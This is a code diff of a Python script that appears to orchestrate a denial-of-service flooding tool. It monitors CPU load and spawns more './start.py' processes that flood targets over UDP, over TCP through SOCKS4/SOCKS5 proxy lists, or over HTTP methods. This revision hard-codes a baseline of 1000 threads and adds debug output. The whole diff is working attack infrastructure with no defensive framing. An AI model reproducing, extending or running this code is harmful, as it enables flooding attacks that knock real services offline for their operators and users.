@@ -139,21 +139,21 @@ def predict_threads_for_cpu(cpu_limit, processes, targets):
 
     # Get overall system CPU usage for context (this is averaged over all cores)
     system_cpu = psutil.cpu_percent(interval=0.1)
-    print(f"[DEBUG] Overall system CPU usage: {system_cpu:.2f}%")
-    print(f"[DEBUG] Total CPU usage from our processes: {total_cpu_usage:.2f}% using {total_threads_running} threads.")
+    total_cores = psutil.cpu_count(logical=False)  # Get number of physical cores
+    print(f"[DEBUG] Overall system CPU usage: {system_cpu:.2f}% across {total_cores} cores.")
 
     # Compute average CPU usage per thread (avoid division by zero)
     if total_threads_running > 0:
         avg_cpu_per_thread = total_cpu_usage / total_threads_running
+        print(total_cpu_usage, total_threads_running)
     else:
         avg_cpu_per_thread = 0.1  # Fallback if nothing is running
 
     print(f"[DEBUG] Average CPU usage per thread: {avg_cpu_per_thread:.4f}%")
 
-    # Baseline prediction: if no threads are running, use a baseline number
+    # Baseline prediction: if no threads are running, set baseline to 1000
     if total_threads_running == 0 or avg_cpu_per_thread == 0:
-        baseline = 20 * len(targets) if len(targets) <= 20 else len(targets)
-        predicted_new_threads = baseline
+        predicted_new_threads = 1000
         print(f"[DEBUG] No running threads or avg_cpu_per_thread is 0, using baseline: {predicted_new_threads}")
     else:
         # Calculate remaining CPU capacity (note: if using multi-core, adjust if needed)
@@ -192,7 +192,7 @@ def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_metho
     the target, randomly kill a process.
     """
     while True:
-        cpu_percent = psutil.cpu_percent(interval=1)
+        cpu_percent = psutil.cpu_percent(interval=1)  # Get the overall CPU usage
         print(f"✨ Overall CPU usage: {cpu_percent}% 💖")
 
         if cpu_percent > cpu_limit:
@@ -207,6 +207,7 @@ def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_metho
                     print(f"Error terminating process {proc.pid}: {e}")
                 processes.remove(proc_tuple)
         elif cpu_percent < cpu_limit:
+            print("Limit not exceeded.")
             new_threads = predict_threads_for_cpu(cpu_limit, processes, targets)
             if new_threads > 0:
                 # Distribute the new threads evenly among targets.
@@ -215,6 +216,8 @@ def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_metho
                     threads_per_target = 1
                 new_threads = threads_per_target * len(targets)
                 print(f"✨ Spawning {new_threads} new threads (~{threads_per_target} per target) 💖")
+
+                # Spawn processes based on the calculated number of threads
                 for target in targets:
                     if target.url.lower().startswith('udp://'):
                         params = ['UDP', target.url[6:], str(udp_threads), str(period)]
@@ -222,7 +225,7 @@ def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_metho
                         p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                         processes.append((p, thread_count))
                     elif target.url.lower().startswith('tcp://'):
-                        # For TCP targets, spawn two processes (one for SOCKS4 and one for SOCKS5)
+                        # For TCP, we launch two processes (one for SOCKS4 and one for SOCKS5)
                         thread_count_each = max(1, threads_per_target // 2)
                         params = ['TCP', target.url[6:], str(thread_count_each), str(period), '4', 'socks4.txt']
                         p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
@@ -236,6 +239,7 @@ def monitor_cpu_usage(processes, cpu_limit, period, rpc, udp_threads, http_metho
                         thread_count = threads_per_target
                         p = subprocess.Popen([sys.executable, './start.py', *list(map(str, params))])
                         processes.append((p, thread_count))
+
         time.sleep(5)  # Check every 5 seconds
 
 
